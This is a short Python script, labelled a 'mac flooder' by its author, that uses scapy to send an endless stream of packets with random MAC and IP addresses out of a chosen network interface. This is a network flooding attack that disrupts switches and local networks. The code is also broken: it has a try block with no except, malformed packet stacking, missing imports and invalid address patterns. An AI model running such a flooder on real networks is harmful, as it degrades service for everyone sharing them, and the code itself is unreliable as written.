#!/usr/bin/env python3

######################################################
# created by : Pushtakio
# purpose : mac flooder with python3
# date :
# version: 1.0.0
#####################################################


import os
import sys

try:
    from scapy.all import Ether
    from scapy.all import IP

packet = Ether(src=RandMAC("*:*:*:*:*:*"),dst=RandMAC("*:*:*:*:*:*"))\
    IP(src=RandIP("*:*:*:*"),dst=RandIP("*:*:*:*"))\
        ICMP()

if len(sys.argv) <2:
    dev = 'wlp3s0'
else:
    dev = sys.argv[1]

sendp(packet,iface = dev, loop=1)